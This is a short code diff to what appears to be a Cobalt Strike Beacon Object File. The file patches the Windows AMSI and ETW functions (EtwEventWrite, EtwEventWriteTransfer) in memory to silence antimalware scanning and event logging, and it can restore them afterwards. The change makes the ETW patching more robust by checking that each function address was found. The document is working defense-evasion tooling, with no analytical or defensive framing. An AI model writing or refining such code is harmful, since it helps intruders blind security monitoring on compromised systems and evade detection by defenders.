@@ -73,11 +73,20 @@ void go(char* args, int len) {
     else if (cmd == 2) {
         ApplyPatch(p_amsi, o_amsi, sizeof(o_amsi), " AMSI Restored.");
     } 
-    else if (cmd == 3) {
-        // Patch BOTH functions to ensure total ETW silence
-        ApplyPatch(p_etwW, p_ret, sizeof(p_ret), " EtwEventWrite Patched.");
-        ApplyPatch(p_etwT, p_ret, sizeof(p_ret), " EtwEventWriteTransfer Patched.");
-    } 
+    if (cmd == 3) {
+        // ONLY patch if the address was found!
+        if (p_etwW != NULL) {
+            ApplyPatch(p_etwW, p_ret, sizeof(p_ret), "[+] EtwEventWrite Patched.");
+        } else {
+            BeaconPrintf(0, "[!] Could not find EtwEventWrite");
+        }
+
+        if (p_etwT != NULL) {
+            ApplyPatch(p_etwT, p_ret, sizeof(p_ret), "[+] EtwEventWriteTransfer Patched.");
+        } else {
+            BeaconPrintf(0, "[!] Could not find EtwEventWriteTransfer");
+        }
+    }
     else if (cmd == 4) {
         ApplyPatch(p_etwW, o_etwW, sizeof(o_etwW), " ETW Restored.");
         ApplyPatch(p_etwT, o_etwT, sizeof(o_etwT), " ETW Transfer Restored.");
